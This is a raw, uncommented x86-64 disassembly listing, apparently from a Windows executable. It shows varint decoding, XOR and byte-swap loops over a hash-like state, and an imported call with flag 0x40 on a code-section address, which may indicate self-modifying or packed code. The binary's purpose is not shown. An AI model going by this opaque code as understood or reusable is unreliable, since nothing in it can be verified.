   1400515da:	movzx  r8d,BYTE PTR [rbx+rdx*1+0x11]
   1400515e0:	test   r8b,r8b
   1400515e3:	jns    0x1400515fd
   1400515e5:	shl    r13,0x7
   1400515e9:	and    r8d,0x7f
   1400515ed:	or     r13,r8
   1400515f0:	mov    rdx,rax
   1400515f3:	jmp    0x1400515d1
   1400515f5:	xor    r11d,r11d
   1400515f8:	jmp    0x140051a70
   1400515fd:	inc    rdx
   140051600:	mov    rcx,rdx
   140051603:	mov    QWORD PTR [rbp+0xd58],rcx
   14005160a:	mov    rax,r13
   14005160d:	shr    rax,0x8
   140051611:	mov    rsi,r13
   140051614:	shr    rsi,0x28
   140051618:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   14005161f:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   140051626:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   14005162d:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   140051634:	mov    DWORD PTR [rbp+0x7d0],eax
   14005163a:	lea    rax,[rip+0x36a17]        # 0x140088058
   140051641:	mov    QWORD PTR [rsp+0x20],rax
   140051646:	lea    rcx,[rbp+0xf80]
   14005164d:	push   0x4
   14005164f:	pop    rdx
   140051650:	lea    r8,[rbp+0x7d0]
   140051657:	mov    r9,rdx
   14005165a:	call   0x1400638fe
   14005165f:	mov    BYTE PTR [rbp+0xf84],sil
   140051666:	mov    rsi,QWORD PTR [rbp+0xd30]
   14005166d:	cmp    QWORD PTR [rbp+0xd78],rsi
   140051674:	jbe    0x1400517a4
   14005167a:	mov    r9,QWORD PTR [rbp+0xd38]
   140051681:	cmp    r9,0x4
   140051685:	ja     0x140059d9c
   14005168b:	mov    rcx,QWORD PTR [rbp+0xd40]
   140051692:	cmp    rcx,0x5
   140051696:	jae    0x140059dae
   14005169c:	mov    r8,QWORD PTR [rbp+0xd78]
   1400516a3:	cmp    r8,rsi
   1400516a6:	je     0x140059dbc
   1400516ac:	mov    eax,DWORD PTR [rbp+rcx*4+0xd88]
   1400516b3:	mov    cl,BYTE PTR [rbp+0xd48]
   1400516b9:	rol    eax,cl
   1400516bb:	sub    r8,rsi
   1400516be:	xor    eax,DWORD PTR [rbp+r9*4+0xd88]
   1400516c6:	xor    edx,edx
   1400516c8:	div    r8
   1400516cb:	mov    rdi,rdx
   1400516ce:	mov    rax,QWORD PTR [rbp+0xd80]
   1400516d5:	mov    QWORD PTR [rbp+0x1060],rax
   1400516dc:	cmp    rsi,0x40
   1400516e0:	push   0x40
   1400516e2:	pop    rax
   1400516e3:	cmovae rsi,rax
   1400516e7:	movaps XMMWORD PTR [rbp+0x800],xmm7
   1400516ee:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   1400516f5:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   1400516fc:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   140051703:	lea    rcx,[rbp+0x7d0]
   14005170a:	mov    rdx,rsi
   14005170d:	call   0x14003c0b8
   140051712:	mov    r10,QWORD PTR [rbp+0xd78]
   140051719:	test   r10,r10
   14005171c:	je     0x14005176a
   14005171e:	mov    rcx,rax
   140051721:	mov    r8,rdx
   140051724:	mov    rax,rdx
   140051727:	add    rax,rdi
   14005172a:	mov    r9,QWORD PTR [rbp+0xd70]
   140051731:	cmp    rax,r10
   140051734:	jbe    0x140051754
   140051736:	xor    r11d,r11d
   140051739:	cmp    r8,r11
   14005173c:	je     0x14005176a
   14005173e:	lea    rax,[r11+rdi*1]
   140051742:	xor    edx,edx
   140051744:	div    r10
   140051747:	mov    al,BYTE PTR [r9+rdx*1]
   14005174b:	mov    BYTE PTR [rcx+r11*1],al
   14005174f:	inc    r11
   140051752:	jmp    0x140051739
   140051754:	add    r9,rdi
   140051757:	xor    eax,eax
   140051759:	cmp    r8,rax
   14005175c:	je     0x14005176a
   14005175e:	mov    dl,BYTE PTR [r9+rax*1]
   140051762:	mov    BYTE PTR [rcx+rax*1],dl
   140051765:	inc    rax
   140051768:	jmp    0x140051759
   14005176a:	mov    rcx,QWORD PTR [rbp+0xd28]
   140051771:	xor    eax,eax
   140051773:	cmp    rsi,rax
   140051776:	je     0x1400517a4
   140051778:	cmp    rcx,0x3f
   14005177c:	ja     0x140059d8e
   140051782:	mov    edx,eax
   140051784:	and    edx,0x7
   140051787:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   14005178e:	xor    dl,BYTE PTR [rbp+rax*1+0x7d0]
   140051795:	inc    rax
   140051798:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   14005179f:	inc    rcx
   1400517a2:	jmp    0x140051773
   1400517a4:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   1400517ab:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   1400517b2:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   1400517b9:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   1400517c0:	xor    eax,eax
   1400517c2:	cmp    rax,0x40
   1400517c6:	je     0x1400517de
   1400517c8:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   1400517cf:	bswap  ecx
   1400517d1:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   1400517d8:	add    rax,0x4
   1400517dc:	jmp    0x1400517c2
   1400517de:	movups xmm0,XMMWORD PTR [rbp+0xd88]
   1400517e5:	mov    eax,DWORD PTR [rbp+0xd98]
   1400517eb:	movups XMMWORD PTR [rbp+0x7d0],xmm0
   1400517f2:	mov    DWORD PTR [rbp+0x7e0],eax
   1400517f8:	and    DWORD PTR [rbp+0x7e4],0x0
   1400517ff:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   140051806:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   14005180d:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   140051814:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   14005181b:	lea    rax,[rbp+0x7e8]
   140051822:	movups XMMWORD PTR [rax+0x30],xmm3
   140051826:	movups XMMWORD PTR [rax+0x20],xmm2
   14005182a:	movups XMMWORD PTR [rax+0x10],xmm1
   14005182e:	movups XMMWORD PTR [rax],xmm0
   140051831:	call   0x140064214
   140051836:	mov    al,BYTE PTR [rip+0x47251]        # 0x140098a8d
   14005183c:	cmp    al,0x1
   14005183e:	je     0x140051887
   140051840:	movzx  eax,al
   140051843:	cmp    eax,0x2
   140051846:	je     0x14005192d
   14005184c:	and    DWORD PTR [rbp+0x710],0x0
   140051853:	lea    rcx,[rip+0xfffffffffffaf826]        # 0x140001080
   14005185a:	mov    rdx,QWORD PTR [rbp+0x1150]
   140051861:	push   0x40
   140051863:	pop    r8
   140051865:	lea    r9,[rbp+0x710]
   14005186c:	call   QWORD PTR [rip+0x42f96]        # 0x140094808
   140051872:	test   eax,eax
   140051874:	sete   cl
   140051877:	inc    cl
   140051879:	mov    BYTE PTR [rip+0x4720e],cl        # 0x140098a8d
   14005187f:	test   eax,eax
   140051881:	je     0x14005192d
   140051887:	mov    al,BYTE PTR [rip+0x4732b]        # 0x140098bb8
   14005188d:	cmp    al,0x1
   14005188f:	je     0x1400518b4
   140051891:	movzx  eax,al
   140051894:	test   eax,eax
   140051896:	jne    0x14005192d
   14005189c:	call   0x140065d51
   1400518a1:	test   rax,rax
   1400518a4:	sete   cl
   1400518a7:	inc    cl
   1400518a9:	mov    BYTE PTR [rip+0x47309],cl        # 0x140098bb8
   1400518af:	test   rax,rax
   1400518b2:	je     0x14005192d
   1400518b4:	call   0x140064227
   1400518b9:	mov    eax,0xc8c291de
   1400518be:	xchg   DWORD PTR [rip+0x4721c],eax        # 0x140098ae0
   1400518c4:	call   QWORD PTR [rip+0x42d86]        # 0x140094650
   1400518ca:	mov    eax,eax
   1400518cc:	mov    QWORD PTR [rip+0x4672d],rax        # 0x140098000
   1400518d3:	lea    rcx,[rbp+0x7d0]
   1400518da:	push   0xffffffffffffffff
   1400518dc:	pop    rdx
   1400518dd:	call   0x14002b840
   1400518e2:	xor    eax,eax
   1400518e4:	xchg   DWORD PTR [rip+0x471f6],eax        # 0x140098ae0
   1400518ea:	mov    BYTE PTR [rip+0x4719d],0x0        # 0x140098a8e
   1400518f1:	mov    eax,DWORD PTR [rbp+0x7d0]
   1400518f7:	add    DWORD PTR [rbp+0xd88],eax
   1400518fd:	mov    eax,DWORD PTR [rbp+0x7d4]
   140051903:	add    DWORD PTR [rbp+0xd8c],eax
   140051909:	mov    eax,DWORD PTR [rbp+0x7d8]
   14005190f:	add    DWORD PTR [rbp+0xd90],eax
   140051915:	mov    eax,DWORD PTR [rbp+0x7dc]
   14005191b:	add    DWORD PTR [rbp+0xd94],eax
   140051921:	mov    eax,DWORD PTR [rbp+0x7e0]
   140051927:	add    DWORD PTR [rbp+0xd98],eax
   14005192d:	mov    BYTE PTR [rip+0x47158],0x0        # 0x140098a8c
   140051934:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   14005193b:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   140051942:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   140051949:	xor    eax,eax
   14005194b:	cmp    rax,0x14
   14005194f:	je     0x140051967
   140051951:	mov    ecx,DWORD PTR [rbp+rax*1+0xd88]
   140051958:	bswap  ecx
   14005195a:	mov    DWORD PTR [rbp+rax*1+0x7d0],ecx
   140051961:	add    rax,0x4
   140051965:	jmp    0x14005194b
   140051967:	mov    r8,QWORD PTR [rbp+0xd20]
   14005196e:	mov    eax,r13d
   140051971:	shr    eax,0x3
   140051974:	and    eax,0x1f
   140051977:	lea    rcx,[rax+rbp*1]
   14005197b:	add    rcx,0x7d0
   140051982:	xor    r9d,r9d
   140051985:	xor    edx,edx
   140051987:	xor    eax,eax
   140051989:	cmp    r9,0x10
   14005198d:	je     0x1400519a8
   14005198f:	shld   rax,rdx,0x8
   140051994:	mov    r10,rdx
   140051997:	shl    r10,0x8
   14005199b:	movzx  edx,BYTE PTR [rcx+r9*1]
   1400519a0:	inc    r9
   1400519a3:	or     rdx,r10
   1400519a6:	jmp    0x140051989
   1400519a8:	push   0xffffffffffffffff
   1400519aa:	pop    r9
   1400519ac:	mov    r10,r9
   1400519af:	mov    ecx,r8d
   1400519b2:	shl    r10,cl
   1400519b5:	cmp    r8,0x40
   1400519b9:	not    r10
   1400519bc:	cmovae r10,r9
   1400519c0:	and    r13d,0x7
   1400519c4:	lea    ecx,[r8+r13*1]
   1400519c8:	neg    cl
   1400519ca:	shrd   rdx,rax,cl
   1400519ce:	shr    rax,cl
   1400519d1:	test   cl,0x40
   1400519d4:	cmove  rax,rdx
   1400519d8:	and    rax,r10
   1400519db:	mov    rsi,QWORD PTR [rbp+0xd60]
   1400519e2:	add    r8,0x7
   1400519e6:	bswap  rax
   1400519e9:	shr    r8,0x3
   1400519ed:	mov    QWORD PTR [rbp+0x1060],rax
   1400519f4:	mov    r9,rsi
   1400519f7:	imul   r9,r8
   1400519fb:	push   0x8
   1400519fd:	pop    rcx
   1400519fe:	sub    rcx,r8
   140051a01:	dec    r8
   140051a04:	mov    rax,QWORD PTR [rbp+0x1168]
   140051a0b:	lea    r11,[rax+r9*1]
   140051a0f:	mov    rax,r9
   140051a12:	xor    edx,edx
   140051a14:	push   0x14
   140051a16:	pop    rdi
   140051a17:	div    rdi
   140051a1a:	cmp    rcx,0x8
   140051a1e:	je     0x140051a44
   140051a20:	cmp    r8,0x7
   140051a24:	ja     0x140059d80
   140051a2a:	imul   rax,rax,0xffffffffffffffec
   140051a2e:	mov    al,BYTE PTR [r11+rax*1]
   140051a32:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   140051a39:	inc    rcx
   140051a3c:	inc    r11
   140051a3f:	inc    r9
   140051a42:	jmp    0x140051a0f
   140051a44:	mov    r11,QWORD PTR [rbp+0x1060]
   140051a4b:	bswap  r11
   140051a4e:	and    r11,r10
   140051a51:	inc    rsi
   140051a54:	mov    QWORD PTR [rbp+0xd60],rsi
   140051a5b:	mov    r9,QWORD PTR [rbp+0xdd0]
   140051a62:	mov    rax,QWORD PTR [rbp+0xdc0]
   140051a69:	mov    r8,QWORD PTR [rbp+0xdc8]
   140051a70:	mov    rdx,r9
   140051a73:	sub    rdx,r8
   140051a76:	sub    rdx,rax
   140051a79:	mov    rcx,QWORD PTR [rbp+0xd20]
   140051a80:	cmp    rdx,rcx
   140051a83:	cmovae rdx,rcx
   140051a87:	cmp    rdx,0x1
   140051a8b:	adc    rdx,0x0
   140051a8f:	mov    r10d,ecx
   140051a92:	sub    r10d,edx
   140051a95:	and    r10b,0x3f
   140051a99:	cmp    rcx,rdx
   140051a9c:	movzx  ecx,r10b
   140051aa0:	mov    r10d,0x0
   140051aa6:	cmovbe ecx,r10d
   140051aaa:	shr    r11,cl
   140051aad:	mov    r10,QWORD PTR [rbp+0xdb0]
   140051ab4:	mov    rsi,QWORD PTR [rbp+0xdb8]
   140051abb:	mov    ecx,edx
   140051abd:	shld   rsi,r10,cl
   140051ac1:	shl    r10,cl
   140051ac4:	test   dl,0x40
   140051ac7:	cmovne rsi,r10
   140051acb:	mov    ecx,0x0
   140051ad0:	cmove  rcx,r10
   140051ad4:	or     rcx,r11
   140051ad7:	mov    QWORD PTR [rbp+0xdb8],rsi
   140051ade:	mov    QWORD PTR [rbp+0xdb0],rcx
   140051ae5:	add    rax,rdx
   140051ae8:	mov    QWORD PTR [rbp+0xdc0],rax
   140051aef:	jmp    0x140051597
   140051af4:	add    rax,0xfffffffffffffff8
   140051af8:	mov    QWORD PTR [rbp+0xdc0],rax
   140051aff:	mov    r9,QWORD PTR [rbp+0xdb8]
   140051b06:	mov    r10,r9
   140051b09:	mov    ecx,eax
   140051b0b:	shr    r10,cl
   140051b0e:	mov    r11,QWORD PTR [rbp+0xdb0]
   140051b15:	mov    rdx,r11
   140051b18:	shrd   rdx,r9,cl
   140051b1c:	push   0xffffffffffffffff
   140051b1e:	pop    rdi
   140051b1f:	mov    rsi,rdi
   140051b22:	shl    rsi,cl
   140051b25:	test   al,0x40
   140051b27:	cmovne rdx,r10
   140051b2b:	mov    ecx,0x0
   140051b30:	cmove  rcx,rsi
   140051b34:	cmove  rsi,rdi
   140051b38:	not    rsi
   140051b3b:	not    rcx
   140051b3e:	and    rcx,r11
   140051b41:	and    rsi,r9
   140051b44:	test   rax,rax
   140051b47:	cmove  rsi,rax
   140051b4b:	cmove  rcx,rax
   140051b4f:	mov    QWORD PTR [rbp+0xdb0],rcx
   140051b56:	mov    QWORD PTR [rbp+0xdb8],rsi
   140051b5d:	add    r8,0x8
   140051b61:	mov    QWORD PTR [rbp+0xdc8],r8
   140051b68:	inc    r14
   140051b6b:	lea    rcx,[rbp+0x500]
   140051b72:	call   0x14003c141
   140051b77:	jmp    0x140051568
   140051b7c:	mov    rcx,QWORD PTR [rbp+0x500]
   140051b83:	mov    rdx,QWORD PTR [rbp+0x508]
   140051b8a:	call   0x14006f7f7
   140051b8f:	lea    rcx,[rbp+0x500]
   140051b96:	push   0x8
   140051b98:	pop    rdx
   140051b99:	call   0x14003c111
   140051b9e:	xor    r14d,r14d
   140051ba1:	cmp    r14,0x8
   140051ba5:	je     0x1400521b5
   140051bab:	mov    r8,QWORD PTR [rbp+0xdc8]
   140051bb2:	mov    r9,QWORD PTR [rbp+0xdd0]
   140051bb9:	lea    rax,[r8+0x8]
   140051bbd:	cmp    rax,r9
   140051bc0:	jbe    0x140051bc9
   140051bc2:	xor    edx,edx
   140051bc4:	jmp    0x1400521a1
   140051bc9:	mov    rax,QWORD PTR [rbp+0xdc0]
   140051bd0:	cmp    rax,0x8
   140051bd4:	jae    0x14005212d
   140051bda:	mov    rcx,QWORD PTR [rbp+0xd60]
   140051be1:	cmp    rcx,QWORD PTR [rbp+0xd68]
   140051be8:	jae    0x140051c2e
   140051bea:	mov    rcx,QWORD PTR [rbp+0xd18]
   140051bf1:	mov    rdx,QWORD PTR [rbp+0xd58]
   140051bf8:	cmp    rdx,rcx
   140051bfb:	jae    0x140051c2e
   140051bfd:	lea    rax,[rbx+0x10]
   140051c01:	movzx  r13d,BYTE PTR [rax+rdx*1]
   140051c06:	and    r13d,0x7f
   140051c0a:	lea    rax,[rdx+0x1]
   140051c0e:	cmp    rax,rcx
   140051c11:	jae    0x140051c3c
   140051c13:	movzx  r8d,BYTE PTR [rbx+rdx*1+0x11]
   140051c19:	test   r8b,r8b
   140051c1c:	jns    0x140051c36
   140051c1e:	shl    r13,0x7
   140051c22:	and    r8d,0x7f
   140051c26:	or     r13,r8
   140051c29:	mov    rdx,rax
   140051c2c:	jmp    0x140051c0a
   140051c2e:	xor    r11d,r11d
   140051c31:	jmp    0x1400520a9
   140051c36:	inc    rdx
   140051c39:	mov    rcx,rdx
   140051c3c:	mov    QWORD PTR [rbp+0xd58],rcx
   140051c43:	mov    rax,r13
   140051c46:	shr    rax,0x8
   140051c4a:	mov    rsi,r13
   140051c4d:	shr    rsi,0x28
   140051c51:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   140051c58:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   140051c5f:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   140051c66:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   140051c6d:	mov    DWORD PTR [rbp+0x7d0],eax
   140051c73:	lea    rax,[rip+0x363de]        # 0x140088058
   140051c7a:	mov    QWORD PTR [rsp+0x20],rax
   140051c7f:	lea    rcx,[rbp+0xf80]
   140051c86:	push   0x4
   140051c88:	pop    rdx
   140051c89:	lea    r8,[rbp+0x7d0]
   140051c90:	mov    r9,rdx
   140051c93:	call   0x1400638fe
   140051c98:	mov    BYTE PTR [rbp+0xf84],sil
   140051c9f:	mov    rsi,QWORD PTR [rbp+0xd30]
   140051ca6:	cmp    QWORD PTR [rbp+0xd78],rsi
   140051cad:	jbe    0x140051ddd
   140051cb3:	mov    r9,QWORD PTR [rbp+0xd38]
   140051cba:	cmp    r9,0x4
   140051cbe:	ja     0x140059d9c
   140051cc4:	mov    rcx,QWORD PTR [rbp+0xd40]
   140051ccb:	cmp    rcx,0x5
   140051ccf:	jae    0x140059dae
   140051cd5:	mov    r8,QWORD PTR [rbp+0xd78]
   140051cdc:	cmp    r8,rsi
   140051cdf:	je     0x140059dbc
   140051ce5:	mov    eax,DWORD PTR [rbp+rcx*4+0xd88]
   140051cec:	mov    cl,BYTE PTR [rbp+0xd48]
   140051cf2:	rol    eax,cl
   140051cf4:	sub    r8,rsi
   140051cf7:	xor    eax,DWORD PTR [rbp+r9*4+0xd88]
   140051cff:	xor    edx,edx
   140051d01:	div    r8
   140051d04:	mov    rdi,rdx
   140051d07:	mov    rax,QWORD PTR [rbp+0xd80]
   140051d0e:	mov    QWORD PTR [rbp+0x1060],rax
   140051d15:	cmp    rsi,0x40
   140051d19:	push   0x40
   140051d1b:	pop    rax
   140051d1c:	cmovae rsi,rax
   140051d20:	movaps XMMWORD PTR [rbp+0x800],xmm7
   140051d27:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   140051d2e:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   140051d35:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   140051d3c:	lea    rcx,[rbp+0x7d0]
   140051d43:	mov    rdx,rsi
   140051d46:	call   0x14003c0b8
   140051d4b:	mov    r10,QWORD PTR [rbp+0xd78]
   140051d52:	test   r10,r10
   140051d55:	je     0x140051da3
   140051d57:	mov    rcx,rax
   140051d5a:	mov    r8,rdx
   140051d5d:	mov    rax,rdx
   140051d60:	add    rax,rdi
   140051d63:	mov    r9,QWORD PTR [rbp+0xd70]
   140051d6a:	cmp    rax,r10
   140051d6d:	jbe    0x140051d8d
   140051d6f:	xor    r11d,r11d
   140051d72:	cmp    r8,r11
   140051d75:	je     0x140051da3
   140051d77:	lea    rax,[r11+rdi*1]
   140051d7b:	xor    edx,edx
   140051d7d:	div    r10
   140051d80:	mov    al,BYTE PTR [r9+rdx*1]
   140051d84:	mov    BYTE PTR [rcx+r11*1],al
   140051d88:	inc    r11
   140051d8b:	jmp    0x140051d72
   140051d8d:	add    r9,rdi
   140051d90:	xor    eax,eax
   140051d92:	cmp    r8,rax
   140051d95:	je     0x140051da3
   140051d97:	mov    dl,BYTE PTR [r9+rax*1]
   140051d9b:	mov    BYTE PTR [rcx+rax*1],dl
   140051d9e:	inc    rax
   140051da1:	jmp    0x140051d92
   140051da3:	mov    rcx,QWORD PTR [rbp+0xd28]
   140051daa:	xor    eax,eax
   140051dac:	cmp    rsi,rax
   140051daf:	je     0x140051ddd
   140051db1:	cmp    rcx,0x3f
   140051db5:	ja     0x140059d8e
   140051dbb:	mov    edx,eax
   140051dbd:	and    edx,0x7
   140051dc0:	mov    dl,BYTE PTR [rbp+rdx*1+0x1060]
   140051dc7:	xor    dl,BYTE PTR [rbp+rax*1+0x7d0]
   140051dce:	inc    rax
   140051dd1:	mov    BYTE PTR [rbp+rcx*1+0xf80],dl
   140051dd8:	inc    rcx
   140051ddb:	jmp    0x140051dac
   140051ddd:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   140051de4:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   140051deb:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   140051df2:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   140051df9:	xor    eax,eax
   140051dfb:	cmp    rax,0x40
   140051dff:	je     0x140051e17
   140051e01:	mov    ecx,DWORD PTR [rbp+rax*1+0xf80]
   140051e08:	bswap  ecx
   140051e0a:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   140051e11:	add    rax,0x4
   140051e15:	jmp    0x140051dfb
   140051e17:	movups xmm0,XMMWORD PTR [rbp+0xd88]
   140051e1e:	mov    eax,DWORD PTR [rbp+0xd98]
   140051e24:	movups XMMWORD PTR [rbp+0x7d0],xmm0
   140051e2b:	mov    DWORD PTR [rbp+0x7e0],eax
   140051e31:	and    DWORD PTR [rbp+0x7e4],0x0
   140051e38:	movaps xmm0,XMMWORD PTR [rbp+0x1060]
   140051e3f:	movaps xmm1,XMMWORD PTR [rbp+0x1070]
   140051e46:	movaps xmm2,XMMWORD PTR [rbp+0x1080]
   140051e4d:	movaps xmm3,XMMWORD PTR [rbp+0x1090]
   140051e54:	lea    rax,[rbp+0x7e8]
   140051e5b:	movups XMMWORD PTR [rax+0x30],xmm3
   140051e5f:	movups XMMWORD PTR [rax+0x20],xmm2
   140051e63:	movups XMMWORD PTR [rax+0x10],xmm1
   140051e67:	movups XMMWORD PTR [rax],xmm0
   140051e6a:	call   0x140064214
   140051e6f:	mov    al,BYTE PTR [rip+0x46c18]        # 0x140098a8d
   140051e75:	cmp    al,0x1
   140051e77:	je     0x140051ec0
   140051e79:	movzx  eax,al
   140051e7c:	cmp    eax,0x2
   140051e7f:	je     0x140051f66
   140051e85:	and    DWORD PTR [rbp+0x710],0x0
   140051e8c:	lea    rcx,[rip+0xfffffffffffaf1ed]        # 0x140001080
   140051e93:	mov    rdx,QWORD PTR [rbp+0x1150]
   140051e9a:	push   0x40
   140051e9c:	pop    r8
   140051e9e:	lea    r9,[rbp+0x710]
   140051ea5:	call   QWORD PTR [rip+0x4295d]        # 0x140094808
   140051eab:	test   eax,eax
   140051ead:	sete   cl
   140051eb0:	inc    cl
   140051eb2:	mov    BYTE PTR [rip+0x46bd5],cl        # 0x140098a8d
   140051eb8:	test   eax,eax
   140051eba:	je     0x140051f66
   140051ec0:	mov    al,BYTE PTR [rip+0x46cf2]        # 0x140098bb8
   140051ec6:	cmp    al,0x1
   140051ec8:	je     0x140051eed
   140051eca:	movzx  eax,al
   140051ecd:	test   eax,eax
   140051ecf:	jne    0x140051f66
   140051ed5:	call   0x140065d51
   140051eda:	test   rax,rax
   140051edd:	sete   cl
   140051ee0:	inc    cl
   140051ee2:	mov    BYTE PTR [rip+0x46cd0],cl        # 0x140098bb8
   140051ee8:	test   rax,rax
   140051eeb:	je     0x140051f66
   140051eed:	call   0x140064227
   140051ef2:	mov    eax,0xc8c291de
   140051ef7:	xchg   DWORD PTR [rip+0x46be3],eax        # 0x140098ae0
   140051efd:	call   QWORD PTR [rip+0x4274d]        # 0x140094650
   140051f03:	mov    eax,eax
   140051f05:	mov    QWORD PTR [rip+0x460f4],rax        # 0x140098000
   140051f0c:	lea    rcx,[rbp+0x7d0]
   140051f13:	push   0xffffffffffffffff
   140051f15:	pop    rdx
   140051f16:	call   0x14002b840
   140051f1b:	xor    eax,eax
   140051f1d:	xchg   DWORD PTR [rip+0x46bbd],eax        # 0x140098ae0
   140051f23:	mov    BYTE PTR [rip+0x46b64],0x0        # 0x140098a8e
   140051f2a:	mov    eax,DWORD PTR [rbp+0x7d0]
   140051f30:	add    DWORD PTR [rbp+0xd88],eax
   140051f36:	mov    eax,DWORD PTR [rbp+0x7d4]
   140051f3c:	add    DWORD PTR [rbp+0xd8c],eax
   140051f42:	mov    eax,DWORD PTR [rbp+0x7d8]
   140051f48:	add    DWORD PTR [rbp+0xd90],eax
   140051f4e:	mov    eax,DWORD PTR [rbp+0x7dc]
   140051f54:	add    DWORD PTR [rbp+0xd94],eax
   140051f5a:	mov    eax,DWORD PTR [rbp+0x7e0]
   140051f60:	add    DWORD PTR [rbp+0xd98],eax
   140051f66:	mov    BYTE PTR [rip+0x46b1f],0x0        # 0x140098a8c
   140051f6d:	movaps XMMWORD PTR [rbp+0x7f0],xmm7
   140051f74:	movaps XMMWORD PTR [rbp+0x7e0],xmm7
   140051f7b:	movaps XMMWORD PTR [rbp+0x7d0],xmm7
   140051f82:	xor    eax,eax
   140051f84:	cmp    rax,0x14
   140051f88:	je     0x140051fa0
   140051f8a:	mov    ecx,DWORD PTR [rbp+rax*1+0xd88]
   140051f91:	bswap  ecx
   140051f93:	mov    DWORD PTR [rbp+rax*1+0x7d0],ecx
   140051f9a:	add    rax,0x4
   140051f9e:	jmp    0x140051f84
   140051fa0:	mov    r8,QWORD PTR [rbp+0xd20]
   140051fa7:	mov    eax,r13d
   140051faa:	shr    eax,0x3
   140051fad:	and    eax,0x1f
   140051fb0:	lea    rcx,[rax+rbp*1]
   140051fb4:	add    rcx,0x7d0
   140051fbb:	xor    r9d,r9d
   140051fbe:	xor    edx,edx
   140051fc0:	xor    eax,eax
   140051fc2:	cmp    r9,0x10
   140051fc6:	je     0x140051fe1
   140051fc8:	shld   rax,rdx,0x8
   140051fcd:	mov    r10,rdx
   140051fd0:	shl    r10,0x8
   140051fd4:	movzx  edx,BYTE PTR [rcx+r9*1]
   140051fd9:	inc    r9
   140051fdc:	or     rdx,r10
   140051fdf:	jmp    0x140051fc2
   140051fe1:	push   0xffffffffffffffff
   140051fe3:	pop    r9
   140051fe5:	mov    r10,r9
   140051fe8:	mov    ecx,r8d
   140051feb:	shl    r10,cl
   140051fee:	cmp    r8,0x40
   140051ff2:	not    r10
   140051ff5:	cmovae r10,r9
   140051ff9:	and    r13d,0x7
   140051ffd:	lea    ecx,[r8+r13*1]
   140052001:	neg    cl
   140052003:	shrd   rdx,rax,cl
   140052007:	shr    rax,cl
   14005200a:	test   cl,0x40
   14005200d:	cmove  rax,rdx
   140052011:	and    rax,r10
   140052014:	mov    rsi,QWORD PTR [rbp+0xd60]
   14005201b:	add    r8,0x7
   14005201f:	bswap  rax
   140052022:	shr    r8,0x3
   140052026:	mov    QWORD PTR [rbp+0x1060],rax
   14005202d:	mov    r9,rsi
   140052030:	imul   r9,r8
   140052034:	push   0x8
   140052036:	pop    rcx
   140052037:	sub    rcx,r8
   14005203a:	dec    r8
   14005203d:	mov    rax,QWORD PTR [rbp+0x1168]
   140052044:	lea    r11,[rax+r9*1]
   140052048:	mov    rax,r9
   14005204b:	xor    edx,edx
   14005204d:	push   0x14
   14005204f:	pop    rdi
   140052050:	div    rdi
   140052053:	cmp    rcx,0x8
   140052057:	je     0x14005207d
   140052059:	cmp    r8,0x7
   14005205d:	ja     0x140059d80
   140052063:	imul   rax,rax,0xffffffffffffffec
   140052067:	mov    al,BYTE PTR [r11+rax*1]
   14005206b:	xor    BYTE PTR [rbp+rcx*1+0x1060],al
   140052072:	inc    rcx
   140052075:	inc    r11
   140052078:	inc    r9
   14005207b:	jmp    0x140052048
   14005207d:	mov    r11,QWORD PTR [rbp+0x1060]
   140052084:	bswap  r11
   140052087:	and    r11,r10
   14005208a:	inc    rsi
   14005208d:	mov    QWORD PTR [rbp+0xd60],rsi
   140052094:	mov    r9,QWORD PTR [rbp+0xdd0]
   14005209b:	mov    rax,QWORD PTR [rbp+0xdc0]
   1400520a2:	mov    r8,QWORD PTR [rbp+0xdc8]
   1400520a9:	mov    rdx,r9
   1400520ac:	sub    rdx,r8
   1400520af:	sub    rdx,rax
   1400520b2:	mov    rcx,QWORD PTR [rbp+0xd20]
   1400520b9:	cmp    rdx,rcx
   1400520bc:	cmovae rdx,rcx
   1400520c0:	cmp    rdx,0x1
   1400520c4:	adc    rdx,0x0
   1400520c8:	mov    r10d,ecx
   1400520cb:	sub    r10d,edx
   1400520ce:	and    r10b,0x3f
   1400520d2:	cmp    rcx,rdx
   1400520d5:	movzx  ecx,r10b
   1400520d9:	mov    r10d,0x0
   1400520df:	cmovbe ecx,r10d
   1400520e3:	shr    r11,cl
   1400520e6:	mov    r10,QWORD PTR [rbp+0xdb0]
   1400520ed:	mov    rsi,QWORD PTR [rbp+0xdb8]
   1400520f4:	mov    ecx,edx
   1400520f6:	shld   rsi,r10,cl
   1400520fa:	shl    r10,cl
   1400520fd:	test   dl,0x40
   140052100:	cmovne rsi,r10
   140052104:	mov    ecx,0x0
   140052109:	cmove  rcx,r10
   14005210d:	or     rcx,r11
   140052110:	mov    QWORD PTR [rbp+0xdb8],rsi
   140052117:	mov    QWORD PTR [rbp+0xdb0],rcx
   14005211e:	add    rax,rdx
